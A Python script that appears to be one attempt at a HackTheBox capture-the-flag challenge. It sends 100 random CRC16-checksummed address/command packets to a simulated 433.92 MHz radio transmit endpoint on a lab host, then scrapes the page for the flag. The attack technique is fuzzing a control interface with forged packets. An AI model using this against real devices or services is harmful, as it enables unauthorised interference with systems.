#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 124: Enviar 100 paquetes random
print("[*] INNOVACIÓN 124: 100 random packets")
s = requests.Session()
s.get(base_url)

import random
for i in range(100):
    addr = random.choice([0xA1, 0xA2, 0xA3, 0xA4, 0xE1, 0xE2, 0xE3])
    cmd = random.choice([0xF1, 0xFF, 0xEE, 0xA0, 0x03, 0x91, 0x53])
    
    data = bytes([addr, cmd])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})

print("[*] Done sending")
time.sleep(5)
r = s.get(base_url)

sensor_states = re.findall(r'spinner-grow (text-\w+)', r.text)
print(f"States: {sensor_states}")

if 'HTB{' in r.text:
    print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))
else:
    print("[-] No flag yet")

print("\n[*] Innovación 124 completada")
